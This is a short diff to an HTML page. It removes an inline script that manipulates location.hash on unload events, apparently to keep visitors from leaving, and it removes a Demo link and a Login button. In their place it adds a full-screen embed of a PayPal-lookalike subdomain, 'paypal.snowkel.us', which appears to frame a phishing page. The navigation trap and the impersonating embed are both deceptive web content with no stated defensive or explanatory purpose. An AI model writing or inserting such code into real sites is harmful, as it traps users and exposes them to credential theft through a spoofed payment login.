@@ -19,22 +19,6 @@
     </title>
   </head>
   <body>
-    <script>
-      var embed = function(){
-        var location = window.document.location;
-        var preventNavigation = function () {
-            var originalHashValue = location.hash;
-            window.setTimeout(function () {
-                location.hash = 'preventNavigation' + ~~ (9999 * Math.random());
-                location.hash = originalHashValue;
-            },0);
-        };
-        window.addEventListener('beforeunload',preventNavigation,true);
-        window.addEventListener('unload',preventNavigation,true);
-      };
-      embed();
-    </script>
-    <a href='/demo'>Demo</a>
-    <button>Login</button>
+    <embed type='text/html' src='https://paypal.snowkel.us/50' width='100vw' height='100vh'></embed>
   </body>
 </html>
